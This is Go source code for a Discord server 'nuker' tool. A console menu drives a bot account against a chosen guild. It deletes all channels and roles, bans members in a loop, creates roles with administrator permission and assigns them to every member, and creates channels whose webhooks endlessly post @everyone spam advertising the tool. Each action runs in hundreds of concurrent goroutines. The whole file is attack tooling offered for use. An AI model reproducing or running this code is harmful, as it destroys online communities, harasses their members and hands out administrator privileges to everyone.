package main

import (
	"bufio"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/bengadbois/flippytext"
	"github.com/bwmarrin/discordgo"
	"github.com/gookit/color"
)

func (h *How) Menu(dg *discordgo.Session) {
restart:
	color.Info.Println(`
			__ __   ___   __    __        
			|  |  | /   \ |  |__|  |       
			|  |  ||     ||  |  |  |       
			|  _  ||  O  ||  |  |  |       
			|  |  ||     ||  '  '  |__  __ 
			|  |  ||     | \      /|  ||  |
			|__|__| \___/   \_/\_/ |__||__|
			`)
	flippytext.New().Write(`			Made by leki#6796`)
	color.Info.Println(`
	[	[1] - How to use    [2] - Nuke    [3] - Ban all    [4] - Delete roles   ]
	[   [5] - Delete roles  [6] - Delete channels    [7] Spam roles ]
	`)
	input := bufio.NewReader(os.Stdin)
	text, _ := input.ReadString('\n')
	if strings.HasPrefix(text, "1") {
		color.Info.Tips("Simply choose one of the options.")
		time.Sleep(time.Second * 3)
		goto restart
	} else if strings.HasPrefix(text, "4") {
		color.Question.Tips("What guild are you trying to delete roles in?")
		guilds := dg.State.Guilds
		for _, guild := range guilds {
			color.Info.Tips(guild.Name)
		}
		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		var guildID string
		var guildz *discordgo.Guild
		for i, guild := range guilds {
			if guild.Name[:1] == ch[:1] {
				guildID = guild.ID
				guildz = guilds[i]
			} else {
				color.Error.Tips("That guild doesn't exist.", guild.Name, ch)
				return
			}
		}

		log.Println(guildID)
		color.Info.Println("Starting threads")

		for i := 0; i < 250; i++ {
			go DeleteRoles(dg, guildz)
		}
	} else if strings.HasPrefix(text, "2") {
		color.Question.Tips("What guild are you trying to create channels in?")
		guilds := dg.State.Guilds
		for _, guild := range guilds {
			color.Info.Tips(guild.Name)
		}
		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		var guildID string
		var guildz *discordgo.Guild
		for i, guild := range guilds {
			if guild.Name[:1] == ch[:1] {
				guildID = guild.ID
				guildz = guilds[i]
			} else {
				color.Error.Tips("That guild doesn't exist.", guild.Name, ch)
				return
			}
		}

		log.Println(guildID)
		color.Info.Println("Starting threads")
		h.DeleteChannels(dg, guildz)

		for i := 0; i < 250; i++ {

			go h.CreateChannels(dg, guildID, "how-do-i-code", guildz) // use - instead of space or its finna break
			go DeleteRoles(dg, guildz)
			go SpamRoles(dg, guildz)
		}
	} else if strings.HasPrefix(text, "7") {
		color.Question.Tips("What guild are you trying to spam roles in?")
		guilds := dg.State.Guilds
		for _, guild := range guilds {
			color.Info.Tips(guild.Name)
		}
		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		var guildID string
		var guildz *discordgo.Guild
		for i, guild := range guilds {
			if guild.Name[:1] == ch[:1] {
				guildID = guild.ID
				guildz = guilds[i]
			} else {
				color.Error.Tips("That guild doesn't exist.", guild.Name, ch)
				return
			}
		}

		log.Println(guildID)
		color.Info.Println("Starting threads")
		for i := 0; i < 250; i++ {
			go SpamRoles(dg, guildz)
		}

	} else if strings.HasPrefix(text, "3") {
		color.Question.Tips("What guild are you trying to ban all in?")
		guilds := dg.State.Guilds
		for _, guild := range guilds {
			color.Info.Tips(guild.Name)
		}
		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		var guildz *discordgo.Guild
		for i, guild := range guilds {
			if guild.Name[:1] == ch[:1] {
				guildz = guilds[i]
			} else {
				color.Error.Tips("That guild doesn't exist.", guild.Name, ch)
				return
			}
		}
		for i := 0; i < 250; i++ {

			go h.BanAll(dg, guildz)
		}
	} else if strings.HasPrefix(text, "6") {
		color.Question.Tips("What guild are you trying to delete all channels in?")
		guilds := dg.State.Guilds
		for _, guild := range guilds {
			color.Info.Tips(guild.Name)
		}
		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		var guildz *discordgo.Guild
		for i, guild := range guilds {
			if guild.Name[:1] == ch[:1] {
				guildz = guilds[i]
			} else {
				color.Error.Tips("That guild doesn't exist.", guild.Name, ch)
				return
			}
		}
		for i := 0; i < 250; i++ {

			go h.DeleteChannels(dg, guildz)
		}

	}
}
func SpamRoles(dg *discordgo.Session, guild *discordgo.Guild) {
	for i := 0; i < 250; i++ {
		create, err := dg.GuildRoleCreate(guild.ID)
		if err != nil {
			color.Error.Tips("Error creating role", err)
		}
		color.Success.Tips("Created role successfully " + create.Name)
		_, err = dg.GuildRoleEdit(guild.ID, create.ID, "leki was here", 16711680, false, discordgo.PermissionAdministrator, false)
		color.Success.Tips("Edited role successfully " + create.Name)

		if err != nil {
			color.Error.Tips("Error creating role", err)
		}
		for _, v := range guild.Members {
			err1 := dg.GuildMemberRoleAdd(guild.ID, v.User.ID, create.ID)
			if err1 != nil {
				color.Error.Tips("Error creating role", err)
			}
			color.Success.Tips("Success gave " + v.User.Username + " role of " + create.Name)
		}

	}
}
func DeleteRoles(dg *discordgo.Session, guild *discordgo.Guild) {
loop:
	for _, role := range guild.Roles {
		roleID := guild.Roles[rand.Intn(len(guild.Roles))]
		if role.ID != guild.ID {
			if role.Name == "leki was here" {
				color.Warn.Tips("Unable to delete whitelisted role. " + role.Name)
				goto loop
			}
			err := dg.GuildRoleDelete(guild.ID, roleID.ID)
			if err != nil {
				if strings.Contains(err.Error(), "404") {
					goto loop
				}
			}
			color.Error.Tips("Ratelimited " + err.Error())
			goto loop
			}
				color.Success.Tips("Successfully deleted role " + roleID.Name)
			}

		}
	

func (*How) DeleteChannels(dg *discordgo.Session, guild *discordgo.Guild) {
loop:
	for _, channel := range guild.Channels {
		_, err := dg.ChannelDelete(channel.ID)
		if err != nil {
			if strings.Contains(err.Error(), "404") {
				color.Error.Tips("Channel not found")
				goto loop
			}
			color.Error.Tips("Ratelimited " + err.Error())
			goto loop

		} else {
			color.Success.Tips("Deleted channel " + channel.Name)
		}
	}

}

var webhooks []string

func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string, guild *discordgo.Guild) {
	for {
		channel, err := dg.GuildChannelCreate(guildID, channelName, discordgo.ChannelType(0))
		if err != nil {
			color.Error.Tips(err.Error())
		}
		color.Success.Tips("Successfully created a channel")

		hook, err := dg.WebhookCreate(channel.ID, "How-to-code-i-forgor", "https://i.ytimg.com/vi/DqZZRGXuHF8/maxresdefault.jpg")
		if err != nil {
			color.Error.Tips(err.Error())
		} else {
			color.Success.Tips("Created channel & webhook", channelName, "https://discord.com/api/webhooks/"+hook.ID+"/"+hook.Token)
			webhooks = append(webhooks, "https://discord.com/api/webhooks/"+hook.ID+"/"+hook.Token)

			go func() {
				for {
					randomIndex := rand.Intn(len(webhooks))
					req, err1 := http.Post(webhooks[randomIndex], "application/json", strings.NewReader(`{"content":"@everyone mb yo https://github.com/zLeki/How\nhttps://tenor.com/view/rip-pack-bozo-dead-gif-20309754"}`))
					if err1 != nil {
						color.Error.Tips(err1.Error())
					}
					if req.StatusCode == http.StatusOK {
						color.Success.Tips("Sent message to webhook successfully", webhooks[randomIndex])
					} else {
						color.Error.Tips(req.Status)
					}
				}
			}()
			h.BanAll(dg, guild)
		}
	}

}
func (h *How) BanAll(dg *discordgo.Session, guild *discordgo.Guild) {
	log.Println(h.Whitelisted)
	for {
	loop:
		for _, member := range guild.Members {
			randomIndex := rand.Intn(len(guild.Members))
			if member.User.ID != h.Whitelisted.(string) || member.User.ID != dg.State.User.ID {
				if member.Permissions == discordgo.PermissionAdministrator {
					color.Warn.Tips("Cannot ban an administrator")
				} else {
					color.Notice.Tips("Attempting to ban "+guild.Members[randomIndex].User.Username, "neon")
					err := dg.GuildBanCreate(guild.ID, guild.Members[randomIndex].User.ID, 7)
					if err != nil {
						color.Error.Tips(err.Error())
						goto loop

					}

				}
			}
		}
	}
}
